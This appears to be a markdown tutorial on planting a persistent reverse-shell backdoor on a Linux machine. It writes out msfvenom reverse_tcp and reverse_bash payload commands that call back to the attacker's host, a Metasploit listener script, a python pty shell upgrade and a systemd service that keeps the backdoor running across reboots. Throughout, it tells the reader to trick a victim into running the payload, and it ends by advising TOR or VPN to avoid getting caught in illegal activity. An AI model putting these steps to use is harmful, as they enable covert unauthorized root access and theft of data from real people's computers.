# Backdoor to any Linux machine

**Myth:** It is said that Linux is secure and does not have any viruses etc. Let's take a look. There is a general claim that no need for Antivirus software is required either. Well...

This is just a short tecnical demonstration without any true hostile attempts. Utilizing the method requires social engineering tactics as well.

This method does not require any server software running on the victim's Linux machine. Just a simple client machine is OK, as well.

# This tutorial assumes you will gain access to `sudo` or `root` terminal on victim's Linux machine by using social engineering tactics.

**1)** Generate a simple Linux backdoor payload. On attacker machine, execute either:

A) Linux x86 binary backdoor payload:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<my_global_ip> lport=<my_global_port> -f elf -a x86 > ~/reverse_backdoor'
```

B) or alternatively generate a shell script backdoor payload:

```
msfvenom -p cmd/unix/reverse_bash LHOST=<my_global_ip> LPORT=<my_global_port> -f raw > reverse_backdoor_bash.sh
```

**2)** If you are behind a router, do PAT (Port Address Translation) where incoming connections to your router are coming from `<my_global_port>`. Let the router forward those to `<my_local_port>` in your local network.

**3)** On your attack machine, add following file (edit contents as needed) and save it as 'backdoor-listener.rc'

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost <my_local_ip>
set lport <my_local_port>
exploit

This is a metasploit script file we will utilize later. Please pay attention to `<my_local_ip>` and `<my_local_port>` values above.

---------------------------

<my_global_ip>   = IPv4 which is reachable from outside (WAN IPv4), usually provided by your ISP
<my_global_port> = Port number which is accessible from outside (WAN) networks
<my_local_ip>    = IPv4 used by your attack machine on the local network, usually static one or provided by a router
<my_local_port>  = Port number which is accessible on your local network

---------------------------

**4)** Run the above Metasploit script file with 'sudo msfconsole -r backdoor-listener.rc' and keep the listener open on your Linux attack machine.

**5)** Send msfvenom-generated 'reverse_backdoor' binary executable to the Linux victim. Requires social engineering tactics.

**6)** Tell your foolish friend to execute `reverse_backdoor` binary on his/her Linux client.

**7)** Once you have connection to the victim's Linux machine, run 'whoami', after which run 'shell'. Both in meterpreter console view

**8)** We assume that the victim has python environment. On the opened empty shell view, just run the following commands (we assume the current user's shell is `/bin/bash`):

```
which python
python -c "import pty; pty.spawn('/bin/bash');"
```

On that code above, we check python binary existence on the Linux victim machine. If OK, then you can open bash with pseudo terminal python function.

**9)** On victim's machine, copy 'reverse_backdoor' binary into `/usr/local/bin/` folder, and run

```
chmod +x /usr/local/bin/reverse_backdoor
```

**10)** Now, insert a new systemd service file 'reverse-backdoor.service' into `/usr/lib/systemd/system/` as follows:

echo -e "[Unit]\nDescription=SSH backdoor\nAfter=network.target network-online.target\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\n\nExecStart=/usr/local/bin/reverse_backdoor\nExecStop=/usr/local/bin/reverse_backdoor\n\n[Install]\nWantedBy=multi-user.target" > /usr/lib/systemd/system/reverse-backdoor.service

**11)** Run

```
sudo systemctl enable reverse-backdoor.service
```

**12)** To check if the service file succeeds, check the output of:

```
sudo systemctl start reverse-backdoor.service
```

**13)** If Ok, you should be able to login to the victim's Linux machine after rebooting it. Just make sure you have Metasploit TCP Handler/Backdoor listener on stand-by on your Linux attack machine.

-----------------------------------------

**/usr/lib/systemd/system/reverse-backdoor.service**

```
[Unit]
Description=SSH backdoor
After=network.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/home/pinqvin/reverse_backdoor_for_ssh.elf
ExecStop=/home/pinqvin/reverse_backdoor_for_ssh.elf

[Install]
WantedBy=multi-user.target
```

-----------------------------------------

Of course, you can adapt this systemd service file as `init` script as well. However, majority of Linux distributions come with systemd nowadays, except for Gentoo etc.

The instructions has been tested and work as expected. You gain root access on the victim's Linux machine, no matter which network the victim has connected to. According to my tester, the opened bash shell process is not visible on graphical system monitor view (this applies to XFCE, at least).

Victim can detect the hostile process and opened network sockets with netstat/sockstat commands. However, distinguishing them is another thing...

-----------------------------------------

Simple attack schema:

```
<victim's Linux machine>  <--->  <ISP, etc.>  <--->  <your router>  <--->  <your attack Linux machine>

 <payload executable>                                                        <backdoor listener>
                  |->>       <my_global_ip>  <------------->  <my_local_ip>   <<-|
                  |->>     <my_global_port>  <------------->  <my_local_port> <<-|

    <execute file>      <--------------------------------------------->   <access victim's machine>
                            <<- valuable data, malicious commands ->>
```

In hardened scenarios, using TOR/VPN is recommended to avoid getting caught if illegal activies are performed.

-----------------------------------------